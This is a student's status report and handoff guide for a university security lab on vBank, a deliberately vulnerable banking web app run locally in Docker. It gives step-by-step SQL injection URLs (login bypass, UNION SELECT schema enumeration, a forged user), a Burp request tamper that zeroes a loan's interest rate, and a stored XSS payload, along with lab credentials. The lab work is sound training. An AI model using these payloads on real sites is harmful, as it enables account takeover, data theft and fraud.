# vBank Lab Report - Status & Guide

**Author:** Ghazal  
**Project:** Security Insider Lab II - vBank (Sphinx) Vulnerable Web Application  
**For:** Seth (teammate)

---

## Current Status

| Exercise | Status | Who |
|----------|--------|-----|
| Exercise 1: Setup | DONE | Ghazal |
| Exercise 2: Client/Server Side Scripting | DONE | Ghazal |
| Exercise 3: SQL Injection | DONE | Ghazal |
| Exercise 4: SQL Injection - New User | DONE (needs screenshots) | **Seth** |
| Exercise 5: Request Manipulation | NOT STARTED | **Seth** |
| Exercise 6: XSS | NOT STARTED | **Seth** |

---

## What Ghazal Already Did

### Exercise 1: Setup
- Docker setup with PHP 8.1, MySQL 8.0, phpMyAdmin
- Fixed all PHP 8 compatibility issues
- LaTeX chapter: `setup_chapter.tex`
- Images: `images/` folder (12 screenshots)

### Exercise 2: Client/Server Side Scripting
- Identified `checkform()` in `htb.js` as client-side protection
- Bypassed using direct URL request to `login.php`
- LaTeX chapter: `exercise2_chapter.tex`
- Images: `images/exercise-2/` folder

### Exercise 3: SQL Injection
- Login bypass via URL: `' OR 1=1 --`
- Password change bypass: `' or 'a'='a`
- Changed bob's password using targeted injection
- LaTeX chapter: `exercise3_4_chapter.tex` (combined with Exercise 4)
- Images: `images/exercise-3/` folder (4 screenshots)

### Exercise 4: SQL Injection - New User (TEXT DONE, NEEDS SCREENSHOTS)
- The LaTeX content is already written in `exercise3_4_chapter.tex`
- Describes ORDER BY injection, UNION SELECT, and creating virtual user
- **Seth: You just need to take screenshots and add them**

---

## What Seth Needs To Do

### Exercise 4: Take Screenshots (5 min)

The text is already done. You just need to perform the attacks and take screenshots:

**Step 1: Find columns with ORDER BY**
- URL: `http://localhost:8080/login.php?username=test&password=' ORDER BY 1 --`
- Increment until error at 9
- **Screenshot:** The error at ORDER BY 9
- Save as: `images/exercise-3/05_order_by_error.png`

**Step 2: Find printed columns**
- URL: `http://localhost:8080/login.php?username=test&password=' UNION SELECT 1,2,3,4,5,6,7,8 --`
- **Screenshot:** Welcome page showing numbers (columns 3,4,5 are displayed)
- Save as: `images/exercise-3/06_union_select.png`

**Step 3: Get database info**
- URL: `http://localhost:8080/login.php?username=test&password=' UNION SELECT 1,2,database(),4,5,6,7,8 --`
- **Screenshot:** Shows "vbank" as database name
- Save as: `images/exercise-3/07_database_name.png`

**Step 4: Get table names**
- URL: `http://localhost:8080/login.php?username=test&password=' UNION SELECT 1,2,group_concat(table_name),4,5,6,7,8 FROM information_schema.tables WHERE table_schema='vbank' --`
- **Screenshot:** Shows table names (accounts, users, etc.)
- Save as: `images/exercise-3/08_table_names.png`

**Step 5: Create fake user**
- URL: `http://localhost:8080/login.php?username=test&password=' UNION SELECT 99,'hacker','hacker','Passau','Student',NULL,NULL,NULL --`
- **Screenshot:** Welcome page showing "Student Hacker"
- Save as: `images/exercise-3/09_fake_user.png`

**After screenshots:** Tell Ghazal and she will add them to the LaTeX file.

---

### Exercise 5: Request Manipulation (30-45 min)

**Goal:** Intercept a loan request and modify the interest rate.

**Steps:**
1. Install Burp Suite (or use OWASP ZAP)
2. Configure Firefox to use Burp as proxy (127.0.0.1:8080)
3. Enable Intercept in Burp
4. Login to vBank normally (alex / hacked)
5. Go to "Request a Loan" page
6. Fill in loan form and submit
7. Burp intercepts the request
8. Find the `interest` parameter (value: 4.2)
9. Change it to `0`
10. Forward the request
11. Check "My Loans" page - loan should show 0% interest

**Screenshots needed:**
- Burp Suite intercepting the request with modified interest
- The loan showing 0% interest in "My Loans" page

**Save as:** `images/exercise-5/01_burp_intercept.png` and `images/exercise-5/02_loan_0_percent.png`

**What to write:** The vulnerable code accepts user-submitted interest rate without server-side validation. Vulnerability name: Insecure Direct Parameter Manipulation (Broken Access Control).

---

### Exercise 6: XSS (30-45 min)

**Goal:** Inject JavaScript that executes in other users' browsers.

**Steps:**
1. Login normally (alex / hacked)
2. Go to "Transfer Money" page
3. In the "Remark" field, inject:
   ```
   <script>alert('XSS');</script>
   ```
4. Submit the transfer
5. When other users view their transactions, the alert pops up

**Alternative injection point:** The transfer remark is displayed on the transactions page without sanitization.

**Screenshots needed:**
- The alert popup appearing
- The remark field with the payload

**Save as:** `images/exercise-6/01_xss_alert.png` and `images/exercise-6/02_xss_payload.png`

**What to write:** The application fails to sanitize user input in the remark field before displaying it. Vulnerability: Reflected/Stored XSS. Fix: HTML-encode all user input before rendering.

---

## Important Info

### Test credentials:
- alex / hacked (password was changed during Exercise 3)
- bob / hacked (password was changed during Exercise 3)

### URLs:
- Application: http://localhost:8080
- phpMyAdmin: http://localhost:8081 (root/root)

### Docker commands:
```bash
cd /Users/poures/Desktop/PC/insider-lab/vBank
docker-compose down
docker-compose up --build -d
```

### Files modified (PHP 8 compatibility):
- `Dockerfile` (created)
- `docker-compose.yml` (build instead of image)
- `app/index.php` (include paths, each() fix)
- `app/login.php` (include paths)
- `app/etc/config.php` (DB credentials)
- `app/etc/htb.inc` (each(), eregi(), mysql_* fixes)
- `app/pages/htbchgpwd.page` (mysql_query -> mysqli_query)

### LaTeX files:
- `setup_chapter.tex` - Exercise 1
- `exercise2_chapter.tex` - Exercise 2
- `exercise3_4_chapter.tex` - Exercise 3 + 4 (combined)

### Image folders:
- `images/` - Exercise 1 (12 screenshots)
- `images/exercise-2/` - Exercise 2
- `images/exercise-3/` - Exercise 3 + 4
- `images/exercise-5/` - Exercise 5 (Seth creates)
- `images/exercise-6/` - Exercise 6 (Seth creates)
